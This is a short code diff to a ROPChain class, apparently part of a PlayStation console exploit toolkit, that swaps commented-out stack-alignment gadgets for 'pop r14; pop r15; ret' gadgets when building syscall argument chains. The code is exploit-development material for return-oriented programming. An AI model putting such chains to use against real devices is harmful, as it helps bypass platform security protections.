@@ -96,10 +96,10 @@ class ROPChain(object):
             self.push_gadget("pop r9; ret")
             self.push_value(r9)
         else:
-            pass
-            #self.push_gadget("pop r9; ret 0xc25a")
-            #self.push_value(r9)
-            #self.extend(b"\0" * 0xC25A)  # align the stack
+            self.push_gadget("pop r14; pop r15; ret")
+            self.push_value(r9)
+            self.push_gadget("pop r14; pop r15; ret")
+            self.push_value(0)
         if self.sc.platform == "ps5":
             self.push_value(self.sc.syscall_addr)
         else:
@@ -122,10 +122,10 @@ class ROPChain(object):
             self.push_gadget("pop r9; ret")
             self.push_value(r9)
         else:
-            pass
-            #self.push_gadget("pop r9; ret 0xc25a")
-            #self.push_value(r9)
-            #self.extend(b"\0" * 0xC25A)  # align the stack
+            self.push_gadget("pop r14; pop r15; ret")
+            self.push_value(r9)
+            self.push_gadget("pop r14; pop r15; ret")
+            self.push_value(0)
         self.push_value(addr)
 
     def push_get_return_value(self):
